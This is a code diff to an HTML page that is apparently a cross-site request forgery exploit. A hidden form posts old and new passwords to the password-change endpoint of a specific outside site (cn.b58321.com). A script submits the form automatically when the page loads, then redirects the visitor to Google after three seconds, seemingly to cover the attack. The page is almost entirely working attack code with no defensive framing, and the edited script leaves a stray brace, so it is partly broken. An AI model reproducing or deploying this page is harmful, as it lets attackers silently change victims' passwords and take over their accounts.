@@ -21,9 +21,9 @@
 
   <!-- CSRF 表单 -->
   <form id="csrfForm" action="https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword" method="POST">
-    <input type="hidden" name="oldPassword" value="123456789">
-    <input type="hidden" name="newPassword" value="123456">
-    <input type="hidden" name="new2Password" value="123456">
+    <input type="hidden" name="oldPassword" value="123456">
+    <input type="hidden" name="newPassword" value="1234567">
+    <input type="hidden" name="new2Password" value="1234567">
   </form>
 
   <script>
@@ -37,11 +37,9 @@
       form.appendChild(btn);
 
       // 表单添加事件（可选拦截）
-      form.onsubmit = function () {
-        // 等 500 毫秒后跳转
-        setTimeout(() => {
-          window.location.href = "https://www.google.com/?hl=zh_TW";
-        }, 3000);
+     const forceRedirect = setTimeout(() => {
+        window.location.href = "https://www.google.com/?hl=zh_TW";
+      }, 3000);
       };
 
       btn.click(); // 自动触发表单提交
